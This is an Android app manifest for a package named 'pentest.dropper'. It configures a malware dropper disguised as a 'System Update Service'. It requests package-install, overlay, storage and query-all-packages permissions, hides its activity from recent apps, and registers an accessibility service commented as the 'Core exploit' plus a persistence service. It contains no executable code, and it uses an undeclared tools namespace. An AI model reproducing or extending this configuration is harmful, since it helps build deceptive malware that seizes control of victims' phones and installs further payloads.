<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.pentest.dropper" android:versionCode="1" android:versionName="2.0">

    <!-- Permisos críticos -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />

    <application android:allowBackup="false" 
                android:debuggable="false"
                android:extractNativeLibs="false"
                android:label="System Update Service"
                android:requestLegacyExternalStorage="true"
                android:theme="@android:style/Theme.DeviceDefault.NoActionBar">

        <!-- Entry point -->
        <activity android:name=".MainActivity"
                  android:exported="true"
                  android:launchMode="singleTask"
                  android:excludeFromRecents="true"
                  android:noHistory="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="shadowdeploy" />
            </intent-filter>
        </activity>

        <!-- Accessibility Service (Core exploit) -->
        <service android:name=".DropperService"
                 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                 android:exported="false"
                 android:enabled="true"
                 android:label="Accessibility Updater">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" 
                       android:resource="@xml/accessibility_config" />
        </service>

        <!-- Persistence -->
        <service android:name=".PersistenceService" 
                 android:foregroundServiceType="specialUse" />

    </application>
</manifest>